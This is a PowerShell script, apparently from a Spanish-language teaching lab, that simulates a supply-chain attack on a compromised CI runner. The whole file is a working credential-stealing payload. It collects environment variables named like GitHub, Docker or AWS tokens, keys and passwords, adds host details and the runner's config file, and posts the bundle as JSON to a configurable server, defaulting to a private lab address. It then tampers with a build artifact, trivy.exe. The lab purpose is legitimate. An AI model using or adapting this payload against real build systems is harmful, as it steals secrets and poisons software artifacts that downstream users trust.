# malicious-exfil.ps1
# Payload de demostración para el laboratorio de Supply Chain Attack
# Este script simula lo que el atacante inyectaría en el runner comprometido

param(
    [string]$ExfilServer = "192.168.56.101",
    [int]$ExfilPort = 8080
)

$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$Hostname = $env:COMPUTERNAME
$Username = $env:USERNAME

# Recolectar secretos de variables de entorno (simulando el robo de tokens)
$Secrets = @{}
Get-ChildItem Env: | ForEach-Object {
    if ($_.Name -match "GITHUB|DOCKER|AWS|SECRET|TOKEN|PASSWORD|KEY") {
        $Secrets[$_.Name] = $_.Value
    }
}

# Recolectar información del sistema
$SystemInfo = @{
    hostname = $Hostname
    username = $Username
    timestamp = $Timestamp
    os = (Get-CimInstance Win32_OperatingSystem).Caption
    ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -match "192.168" }).IPAddress
}

# Crear payload de exfiltración
$Payload = @{
    system = $SystemInfo
    secrets = $Secrets
    runner_config = @{
        path = "C:\actions-runner"
        config = Get-Content "C:\actions-runner\.runner" -ErrorAction SilentlyContinue
        logs = Get-ChildItem "C:\actions-runner\_diag" -ErrorAction SilentlyContinue | Select-Object -First 3 | ForEach-Object { $_.Name }
    }
} | ConvertTo-Json -Depth 3

# Exfiltrar vía HTTP POST
Write-Host "[PAYLOAD] Exfiltrando datos a http://${ExfilServer}:${ExfilPort}/exfil ..." -ForegroundColor Red

try {
    $Uri = "http://${ExfilServer}:${ExfilPort}/exfil"
    $Response = Invoke-WebRequest -Uri $Uri -Method POST -Body $Payload -ContentType "application/json" -TimeoutSec 10
    Write-Host "[PAYLOAD] Exfiltración exitosa. Status: $($Response.StatusCode)" -ForegroundColor Green
} catch {
    Write-Host "[PAYLOAD] Error en exfiltración: $_" -ForegroundColor Yellow
    # Fallback: guardar en archivo temporal
    $Payload | Out-File -FilePath "C:\Windows\Temp\exfil_backup.json" -Encoding UTF8
    Write-Host "[PAYLOAD] Datos guardados en C:\Windows\Temp\exfil_backup.json" -ForegroundColor Yellow
}

# Simular modificación de binario (envenenamiento de artefacto)
Write-Host "[PAYLOAD] Inyectando backdoor en artefacto de build..." -ForegroundColor Red
$ArtifactPath = "C:\actions-runner\_work\trivy-demo-lab\trivy-demo-lab\dist\trivy.exe"
if (Test-Path $ArtifactPath) {
    Add-Content -Path $ArtifactPath -Value "`n# BACKDOOR_INJECTED_$Timestamp`n" -NoNewline
    Write-Host "[PAYLOAD] Artefacto envenenado: $ArtifactPath" -ForegroundColor Green
} else {
    Write-Host "[PAYLOAD] Artefacto no encontrado, creando señuelo..." -ForegroundColor Yellow
    New-Item -ItemType Directory -Path (Split-Path $ArtifactPath) -Force | Out-Null
    "FAKE_BINARY_BACKDOOR" | Out-File -FilePath $ArtifactPath -Force
}

Write-Host "[PAYLOAD] Ejecución completada." -ForegroundColor Green
